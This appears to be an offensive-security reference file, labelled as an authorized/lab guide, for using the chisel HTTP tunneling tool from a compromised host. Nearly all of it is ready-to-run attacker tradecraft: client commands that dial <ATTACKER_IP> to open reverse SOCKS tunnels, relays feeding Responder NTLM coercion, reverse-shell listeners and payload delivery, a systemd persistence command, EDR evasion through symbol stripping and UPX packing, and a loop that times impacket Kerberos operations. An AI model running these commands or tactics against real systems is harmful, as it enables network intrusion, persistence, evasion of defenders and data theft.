---
name: chisel
description: "Auth/lab ref: HTTP-based TCP/UDP tunneling tool for port forwarding and SOCKS5 proxying through firewalls."
---

# chisel

**Goal**: Establish reverse and forward TCP/UDP tunnels using HTTP over WebSockets. Ideal for environments where SSH/TUN is unavailable or blocked.

## Cognitive Stance

Chisel is an asymmetrical binary (client and server are bundled in one executable). In most offensive scenarios, the **Attacker runs the Server** and the **Compromised Host runs the Client**, establishing a persistent WebSocket tunnel outbound (to bypass NAT/inbound firewall rules).

## 1. Core Executions

### Attacker Setup (Server)
Start the server to listen for incoming connections from the compromised host, enabling reverse tunnels and SOCKS.

```bash
# Listen on port 8000. Accept reverse tunnels and SOCKS queries.
./chisel server -p 8000 --reverse --socks5
```

### Compromised Host Setup (Client)

**Reverse SOCKS5 (Dynamic Port Forwarding)**
The client dials the attacker, telling the attacker's Chisel server to spawn a SOCKS5 proxy locally on the attacker's machine (default port `1080`).
```bash
./chisel client <ATTACKER_IP>:8000 R:socks
```
*Result*: The attacker can now wrap their tools (e.g., `proxychains nmap`) through `127.0.0.1:1080` to reach the internal network behind the compromised host.

**Reverse Single Port Forwarding**
The attacker wants to reach a specific internal service (e.g., an RDP server at `10.0.0.5:3389`) that the compromised host can see.
```bash
# Syntax: R:<Local_Attacker_Port>:<Target_IP>:<Target_Port>
./chisel client <ATTACKER_IP>:8000 R:3389:10.0.0.5:3389
```

## 2. Advanced Evasion & Tunneling

- **TLS / HTTPS Masking**: Chisel supports TLS natively to avoid Deep Packet Inspection (DPI) flagging plain WebSockets.
  - Server: `./chisel server -p 443 --reverse --socks5 --tls-cert cert.pem --tls-key key.pem`
  - Client: `./chisel client https://<ATTACKER_IP> R:socks` (Add `--skip-tls-verification` if using self-signed certs).
- **Authentication**: Prevent Blue Teams or scanners from hijacking your Chisel C2:
  - Add `--auth user:password` to both client and server executions.

## 3. Multi-forward pattern (SOCKS + port relays in one tunnel)

Combine reverse SOCKS with multiple local port forwards in a single client invocation — avoids spawning multiple chisel processes:
```bash
# Compromised host: SOCKS + relay SMB/reverse-shell/HTTP through the tunnel
./chisel client <ATTACKER_IP>:8000 \
  R:socks \
  0.0.0.0:445:<ATTACKER_IP>:445 \
  0.0.0.0:4445:<ATTACKER_IP>:4445 \
  0.0.0.0:80:<ATTACKER_IP>:8099
```
This gives the attacker: SOCKS5 at `127.0.0.1:1080` into the internal net; box:445 → attacker Responder (NTLM coercion relay); box:4445 → attacker listener (reverse shells from internal hosts); box:80 → attacker HTTP server (payload delivery to internal hosts that can only reach the box).

**Persistence on systemd targets**: when the compromised host runs systemd and you have root, launch chisel as a transient unit — survives shell deaths and cgroup kills (e.g. stopping a crashed service that spawned your shell):
```bash
sudo systemd-run --unit=pivot-chisel --collect \
  /tmp/chisel client <ATTACKER_IP>:8000 R:socks 0.0.0.0:445:<ATTACKER_IP>:445
```

## 4. Strict Quality Gates

- **TCP Meltdown**: Avoid running intense TCP scans (like `nmap -sT -T4`) over SOCKS. Chisel multiplexes TCP over TCP, which causes performance collapse ("TCP Meltdown") due to conflicting re-transmission timers. Slow down scans and keep concurrency low.
- **OPSEC**: Modern EDRs aggressively flag the default `chisel` filename and common command-line arguments (`R:socks`). Compile from source using `-ldflags="-s -w"` to strip symbols and use UPX packing, or pass the connection string via environment variables if supported.

## 5. Short-lived reverse tunnel — diagnose the ingress path first

A reverse session that binds (`proxy#R:... Listening` / `Bound proxies`) then drops after a few seconds (`SSH disconnected`) is usually the **ingress path** — most often the **target/lab network resetting the back-connection** to your operator IP (HTB/OpenVPN labs commonly do this) — not chisel, and usually not your own local layer (NAT, port-forward proxy, Docker/WSL published port, cloud SNAT). The kill is path-specific, so localize it before blaming your tunnel or host runtime.

- **Diagnose, don't assume**: run a control first — a chisel client from any host on a clean path (loopback, or a box on the same LAN as the server) to the same listener. If the control stays up but the back-connection *through the target* dies in seconds, the kill is the **target/lab egress**, not your tunnel/NAT/runtime — don't burn time "fixing" local plumbing. Try `--keepalive 3s` (can defeat an *idle* timeout; will NOT defeat a hard reset).
- **Stale-listener trap**: after a client dies, leftover loopback listeners (old `socat`/prior chisel clients squatting `R:<port>`) make the server log `server: cannot listen on R:<port>` and leave listeners that **accept then forward nothing** → `Connection refused`, truncated reads, or impacket `unpack requires a buffer of 4 bytes`. Kill stale forwarders by **explicit PID or `pkill -x <name>`**, never `pkill -f <pattern>` (it matches your own shell and self-kills).
- **Prefer the forward direction** when the compromised host can accept a new inbound port: run `chisel server` on the host, attacker runs `chisel client <host>:<port> socks`. DC/host firewalls usually block new inbound ports — test first.
- **Window-sync pattern (when the reverse path is genuinely short-lived, whatever the cause)**: hold the client alive in a long-lived parent session (`--max-retry-interval 1s`), then **poll the forwarded loopback port and fire a sub-second op the instant it opens**:
  ```bash
  while :; do timeout 1 bash -c 'echo>/dev/tcp/127.0.0.1/88' 2>/dev/null && { <impacket op>; break; }; sleep 0.2; done
  ```
  Single Kerberos `getTGT`/`getST`/S4U or one quick query fit one window. **Interactive/sustained sessions (MSSQL shell, long SOCKS, bloodhound-python) do NOT** — mint tickets/keys offline (or via a quick window) and run the heavy step from a host with **direct** routing, or dump data offline and exfil rather than holding a live connection.
